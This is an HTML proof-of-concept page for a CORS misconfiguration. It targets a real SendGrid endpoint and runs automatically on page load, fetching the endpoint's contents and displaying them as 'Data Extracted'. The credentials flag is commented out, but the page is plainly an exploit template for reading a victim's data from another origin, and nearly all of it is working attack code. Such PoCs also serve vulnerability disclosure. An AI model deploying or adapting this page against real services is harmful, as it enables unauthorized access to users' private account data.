<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploitation PoC</title>
</head>
<body>
    <h1>CORS Vulnerability - Proof of Concept</h1>
    <p>Targeting: <code id="target-url">https://mc.sendgrid.com/automations?view=raw</code></p>
    
    <div id="result" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">
        Waiting for response...
    </div>

    <script>
        const target = "https://mc.sendgrid.com/automations?view=raw";
        document.getElementById('target-url').innerText = target;

        function exploit() {
            var xhr = new XMLHttpRequest();
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    if (xhr.status == 200) {
                        document.getElementById('result').innerHTML = 
                            "<h3>Success! Data Extracted:</h3><pre>" + 
                            escapeHtml(xhr.responseText) + "</pre>";
                    } else {
                        document.getElementById('result').innerHTML = 
                            "<h3 style='color:red;'>Failed! Status: " + xhr.status + "</h3>";
                    }
                }
            };

            xhr.open("GET", target, true);
           // xhr.withCredentials = true; 
            xhr.send();
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        window.onload = exploit;
    </script>
</body>
</html>
